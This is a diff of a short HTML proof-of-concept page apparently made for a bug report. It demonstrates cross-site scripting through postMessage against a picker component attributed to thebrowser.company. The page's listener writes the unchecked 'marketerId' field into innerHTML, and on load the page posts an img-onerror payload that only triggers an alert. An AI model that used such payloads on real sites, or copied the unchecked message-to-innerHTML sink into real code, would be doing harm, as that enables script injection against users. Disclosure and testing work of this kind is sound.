@@ -1,27 +1,46 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>PoC - Custom Picker XSS</title>
+  <title>🔥 PoC - thebrowser.company XSS</title>
   <style>
-    body { font-family: sans-serif; background: #f5f5f5; padding: 20px; }
-    #output { padding: 1rem; background: white; border: 2px solid #ccc; margin-top: 20px; }
+    body { font-family: sans-serif; background: #f4f4f4; padding: 20px; }
+    #output {
+      margin-top: 30px;
+      background: #fff;
+      padding: 20px;
+      border: 2px solid #ccc;
+      min-height: 50px;
+    }
   </style>
 </head>
 <body>
-  <h2>🧪 Rebuilt Picker Component (Simulated)</h2>
-  <p>Waiting for <code>postMessage</code> containing <code>marketerId</code>...</p>
+  <h1>✅ PoC: thebrowser.company XSS via postMessage</h1>
+  <p>Rebuilding vulnerable picker and injecting <code>marketerId</code> content</p>
 
-  <div id="output">Nothing received yet.</div>
+  <div id="output">[ Waiting for message... ]</div>
 
   <script>
+    // Simulate the vulnerable picker component
     window.addEventListener("message", (event) => {
-      console.log("📥 Message received:", event.data);
-
       if (event.data?.message === "OB_SHOULD_SHOW_PICKER") {
-        const content = event.data.content?.marketerId || "⚠️ No marketerId provided";
-        document.getElementById("output").innerHTML = content;
+        const html = event.data.content?.marketerId?.[0] || "No marketerId";
+        console.log("📥 Received marketerId:", html);
+        document.getElementById("output").innerHTML = html;
       }
     });
+
+    // Auto-send the payload to self (simulate cross-origin source)
+    window.onload = () => {
+      console.log("🚀 Sending XSS payload via postMessage...");
+      window.postMessage({
+        message: "OB_SHOULD_SHOW_PICKER",
+        content: {
+          marketerId: [
+            `<img src=x onerror="alert('🔥 XSS Executed from PoC')">`
+          ]
+        }
+      }, "*");
+    };
   </script>
 </body>
 </html>
